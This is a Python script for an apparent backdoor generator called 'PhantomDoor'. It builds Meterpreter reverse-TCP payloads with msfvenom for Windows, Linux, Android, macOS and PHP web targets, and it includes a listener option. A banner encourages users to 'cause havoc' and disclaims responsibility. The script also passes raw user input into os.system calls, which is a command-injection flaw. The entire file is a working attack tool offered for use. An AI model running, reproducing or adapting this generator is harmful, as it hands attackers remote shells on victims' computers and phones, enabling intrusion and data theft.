#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os 
import sys
import socket
sys.path.append('core/')
from listener import *

print("""

_____________________________________________________________ 
|                                                   ^^^^^^^^\ |
| LEGAL WARNING: While this may be helpful for      |       | |
| some, there are significant risks. You are        |_ __   | | 
| hereby allowed to cause havoc with this but       (.(. )  | |
| the coder won't be held responsible for   _      (_       ) | 
| any damage you cause :) if you get in     \\      /___/'  / |  
| trouble I don't care :)                   _\\_      \    |  |
| [!] READ terms.txt BEFORE STARTING!      ((   )     /====|  |
|      HAPPY HACKING TO ALL :)              \  <.__._-      \ |
|___________________________________________ <//___.         ||


[---]           PhantomDoor Backdoor Generator and Listener                 [---]
[---]                                                                       [---]
[---]                     Coded By venom0x16                                [---]
[---]                github=> github.com/venom0x16                          [---]
[---]      Contact me with Instagram => instagram.com/venom0x16/            [---]
[---]              							    [---]
[---]              Design credits to => Zerodoor.py			    [---]
 
1) BackDoors 
2) Listener

""")

choice = raw_input("Enter your choice #~:  ")

if(choice=="1"):
	print("""
	          	,----------------,                ,---------, 
		    ,--------------------------,        ,"        ," |
		  ,"                       ,"  |       ,"        ,"  |
		 +------------------------+ |  |     ,"        ,"    |
		 |  .--------------------.  |  |     +---------+     |
		 |  |                    |  |  |     | -==----'|     |
		 |  |$>wget backdoors    |  |  |     |         |     |
		 |  | chmod +x backdoors |  |  |/----|`---=    |     |
		 |  |  ./backdoors pwn   |  |  |     |==== ooo |      ;
		 |  |                    |  |  |     |(((( [33]|    ,"
		 |  `--------------------'  |,"      | |((((   |  ,"
		 +-----------------------+  ;;       | |       |,"     
		    /_)______________(_/  //'       +.---------+
	       ___________________________/___  
	      /  oooooooooooooooo  .o.  oooo /,   
	     / ==ooooooooooooooo==.o.  ooo= //   
	    /_==__==========__==_ooo__ooo=_/'   
	    `-----------------------------'

		           ~ 5 Immersive Backdoors ~ 


1. Backdoor for Windows
2. Backdoor for Linux
3. Backdoor for Android
4. Backdoor for MacOS
5. Backdoor for Web


       """)
	bd = raw_input("Which Backdoor You want to generate? #~: ")

	if(bd=="1"):
		os.system("clear")
		os.system("figlet WINDOWS BACKDOOR")
		lhost = raw_input("LHOST: ")
		lport = raw_input("LPORT: ")
		os.system("msfvenom -p windows/meterpreter/reverse_tcp lhost=" + lhost + " lport="  + lport + " -f exe > /root/Desktop/backdoor.exe")
		print("(*) Backdoor generated. Happy Hacking :D")

	if(bd=="2"):
		os.system("clear")
		os.system("figlet LINUX BACKDOOR")
		lhost = raw_input("LHOST: ")
		lport = raw_input("LPORT: ")
		os.system("msfvenom -p python/meterpreter/reverse_tcp lhost=" + lhost + " lport=" + lport + " > /root/Desktop/backdoor.py")
		print("(*) Backdoor generated. Happy Hacking :D")


	if(bd=="3"):
		os.system("clear")
		os.system("figlet ANDROID BACKDOOR")
		lhost = raw_input("LHOST: ")
		lport = raw_input("LPORT: ")
		os.system("msfvenom -p  android/meterpreter/reverse_tcp lhost=" + lhost + " lport=" + lport + " > /root/Desktop/backdoor.apk")
		print("(*) Backdoor generated. Happy Hacking :D")


	if(bd=="4"):
		os.system("clear")
		os.system("figlet MacOS BACKDOOR")
		lhost = raw_input("LHOST: ")
		lport = raw_input("LPORT: ")
		os.system("msfvenom -p  java/meterpreter/reverse_tcp lhost=" + lhost + " lport=" + lport + " -f jar > /root/Desktop/backdoor.jar")
		print("(*) Backdoor generated. Happy Hacking :D")


	if(bd=="5"):
		os.system("clear")
		os.system("figlet WEB BACKDOOR")
		lhost = raw_input("LHOST: ")
		lport = raw_input("LPORT: ")
		os.system("msfvenom -p  php/meterpreter/reverse_tcp lhost= " + lhost + " lport= " + lport + " > /root/Desktop/backdoor.php")
		print("(*) Backdoor generated. Happy Hacking :D")

if(choice=="2"):
	listener()


	 


	

		
	 
 
                         
                                          
